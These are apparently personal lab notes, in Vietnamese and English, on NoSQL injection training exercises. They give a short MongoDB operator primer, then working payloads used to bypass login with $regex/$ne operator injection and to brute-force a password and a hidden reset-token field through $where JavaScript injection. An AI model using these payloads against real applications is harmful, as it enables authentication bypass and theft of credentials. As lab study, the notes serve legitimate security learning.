## Syntax of MongoDB
1. use operator**$where** , which allow you javascript expression or function to filter document . if javascript expression or function return true then document is selected.
- because javascript expression then it use synax of javascript

2.  MongoDB standard Bson syntax
- VD : db.users.find({ age: 20 + 5 }) will evaluate expression js : 20+5 = 25 

3. operator in mongodb
| Operator | Ý nghĩa                          |
| -------- | -------------------------------- |
| `$eq`    | Bằng (`==`)                      |
| `$ne`    | Không bằng (`!=`)                |
| `$gt`    | Lớn hơn (`>`)                    |
| `$gte`   | Lớn hơn hoặc bằng (`>=`)         |
| `$lt`    | Nhỏ hơn (`<`)                    |
| `$lte`   | Nhỏ hơn hoặc bằng (`<=`)         |
| `$in`    | Nằm trong mảng các giá trị       |
| `$nin`   | Không nằm trong mảng các giá trị |




## Lab: Detecting NoSQL injection
![image](https://hackmd.io/_uploads/H1Herb6cle.png)

- start:
- request: ![image](https://hackmd.io/_uploads/BJNAHZa9xe.png)
- payload : Accessories' gẫy lối syntax và thấy thông báo lỗi thấy backend sử dụng MongoDB
- có thể câu truy vấn backend như sau : 
    - db.products.find($where: 'this.category== $_GET["category"] && release == 1)
    - db.products.find({$_GET["category"] , release == 1})
- payload : Accessories'%00 với kí tự null đã làm mất đi một phần logic <appear 4 products , nommal 3 products>==> backend dùng kiểu $where để biết query
- payload : Accessories'||1%00

## Lab: Exploiting NoSQL operator injection to bypass authentication

![image](https://hackmd.io/_uploads/S15H8f69lx.png)

- satrt:
- request login :![image](https://hackmd.io/_uploads/BJ6N_Ga9xg.png). body  của request là dạng json
- syntax of BE could be : db.products.find({username:wiener,password:peter})
- payload : ![image](https://hackmd.io/_uploads/S12Bsf69le.png)
replace wiener by administrator but don't success . Maybe
username don't 'administrator' . Maybe keyword 'admin' include in username . use $regex
payload : ![image](https://hackmd.io/_uploads/BJ-qCMp9le.png)
payload trên chèn vào BE thành : ![image](https://hackmd.io/_uploads/r1Qdemp5el.png)


## Lab: Exploiting NoSQL injection to extract data

![image](https://hackmd.io/_uploads/H1APWmacee.png)


- start:
- request user lookup function : ![image](https://hackmd.io/_uploads/r1p6SDT5ge.png)
- if we change value of user by administrator , we get information of administrator . 
- payload : administrator'  will receive error syntax
- the query in the BE could be : **db.users.find({
  $where: "this.username == 'administrator'"
})** because keyword ' make  error , syntax Bson use syntax formal json use parse ""
- payload : **administrator'%26%26'a'%3d%3d'a** receive 200OK
- use error base to solve
- payload : ' && this.password.length=='8 . In js 8=='8' return true
- payload : user=administrator'%26%26+this.password.length+>'0  . receive 200OK
- payload : user=administrator'%26%26+this.password.length+%3d%3d'8  . receive 200 OK  . It proves that the password length is 8

- use intruder to brute force password . 
- paylaod: **administrator'+%26%26+this.password[0]%3d%3d'a** . brute force two positions 0 and a


## Lab: Exploiting NoSQL operator injection to extract unknown fields

![image](https://hackmd.io/_uploads/SkVZB5acxe.png)

- start:
- two function maybe use database . login , forgot-password . Found the forgot-password don't have email maybe token save in database.
- the query of backend could be : **db.users.find({
  username: "carlos",
  password: "hehe"
})**

- request login : ![image](https://hackmd.io/_uploads/ByjYHoTcgg.png)
paylaod : ![image](https://hackmd.io/_uploads/rJAQUspqlg.png)
response : **Account locked: please reset your password** , it proves that $ne oporator is evaluated .
- target : identify hidden filed name in mongoDB . then use javascript ==> use $where
- identify $where is evaluated???
- payload : ![image](https://hackmd.io/_uploads/r1jTYia9ex.png)
response : **invalid .....** if i replace keywords 0 by 1 , response : **Account locked: please reset your password**

thereforce , i conform  $where operator is valuated . 

- ![image](https://hackmd.io/_uploads/S1tnhoaqle.png)
it refer database obtain 5 fileds name . 
- payload : ![image](https://hackmd.io/_uploads/ByyJJ3pcxg.png)
brute force parameter 0 , confirm 4 valid
- identidy name key 
- ![image](https://hackmd.io/_uploads/rJ4me3p5lg.png)
 key length = 13
 -payload : ![image](https://hackmd.io/_uploads/SyEcl36clx.png)
brute force . 
**keyname : resetPwdToken**
- payload : ![image](https://hackmd.io/_uploads/SJMH4nacex.png)
it refer length = 16 
payload : ![image](https://hackmd.io/_uploads/BkGtN3p5lx.png)
brute force 
**value of field : 52832594664969b6**

**resetPwdToken=52832594664969b6**



        